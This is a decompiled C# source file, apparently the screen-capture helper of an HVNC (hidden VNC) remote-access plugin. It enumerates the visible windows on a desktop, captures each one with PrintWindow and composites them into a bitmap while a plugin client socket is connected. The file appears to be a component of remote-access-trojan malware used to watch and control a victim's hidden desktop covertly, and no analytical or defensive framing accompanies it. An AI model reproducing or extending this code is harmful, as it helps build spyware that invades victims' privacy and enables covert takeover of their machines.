using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using HVNC;
using S;

namespace VNC
{
	// Token: 0x02000005 RID: 5
	internal class HelperScreen
	{
		// Token: 0x06000035 RID: 53
		[DllImport("user32")]
		public static extern bool GetWindowRect(IntPtr hWnd, ref HelperScreen.RECT lpRect);

		// Token: 0x06000036 RID: 54
		[DllImport("user32.dll")]
		public static extern bool IsWindowVisible(IntPtr hWnd);

		// Token: 0x06000037 RID: 55
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool EnumDesktopWindows(IntPtr hDesktop, HelperScreen.EnumDelegate lpEnumCallbackFunction, IntPtr lParam);

		// Token: 0x06000038 RID: 56
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

		// Token: 0x06000039 RID: 57
		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowDC(IntPtr hWnd);

		// Token: 0x0600003A RID: 58
		[DllImport("user32.dll")]
		public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

		// Token: 0x0600003B RID: 59
		[DllImport("gdi32.dll")]
		public static extern bool DeleteDC(IntPtr hDC);

		// Token: 0x0600003C RID: 60
		[DllImport("user32.dll")]
		public static extern IntPtr GetTopWindow(IntPtr hWnd);

		// Token: 0x0600003D RID: 61 RVA: 0x000030C0 File Offset: 0x000012C0
		public static bool List_screen(IntPtr hWnd, int lParam)
		{
			bool result;
			try
			{
				bool flag = HelperScreen.IsWindowVisible(hWnd);
				bool flag2 = flag;
				if (flag2)
				{
					bool flag3 = hWnd == IntPtr.Zero;
					bool flag4 = flag3;
					if (flag4)
					{
						return false;
					}
					HelperScreen.Num_List.Add(hWnd);
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00003128 File Offset: 0x00001328
		public static Bitmap GetScreen(int x, int y)
		{
			HelperScreen.Num_List = new List<IntPtr>();
			Bitmap bitmap = new Bitmap(x, y);
			bool flag = HelperScreen.EnumDesktopWindows(IntPtr.Zero, new HelperScreen.EnumDelegate(HelperScreen.List_screen), IntPtr.Zero);
			bool flag2 = flag;
			if (flag2)
			{
				for (int i = HelperScreen.Num_List.Count - 1; i > -1; i += -1)
				{
					bool flag3 = !Plugin.Helper.IsRunning && !Plugin.ClientSocket.isConnected;
					bool flag4 = flag3;
					if (flag4)
					{
						break;
					}
					HelperScreen.RECT rect = default(HelperScreen.RECT);
					IntPtr intPtr = HelperScreen.Num_List[i];
					ScreenCapture screenCapture = new ScreenCapture();
					Bitmap image = screenCapture.CaptureWindow(HelperScreen.Num_List[i]);
					HelperScreen.GetWindowRect(HelperScreen.Num_List[i], ref rect);
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.DrawImage(image, rect.Left, rect.Top);
					}
				}
			}
			return bitmap;
		}

		// Token: 0x04000018 RID: 24
		public static List<IntPtr> Num_List;

		// Token: 0x02000014 RID: 20
		// (Invoke) Token: 0x06000085 RID: 133
		public delegate bool EnumDelegate(IntPtr hWnd, int lParam);

		// Token: 0x02000015 RID: 21
		public struct RECT
		{
			// Token: 0x04000048 RID: 72
			public int Left;

			// Token: 0x04000049 RID: 73
			public int Top;

			// Token: 0x0400004A RID: 74
			public int Right;

			// Token: 0x0400004B RID: 75
			public int Bottom;
		}
	}
}
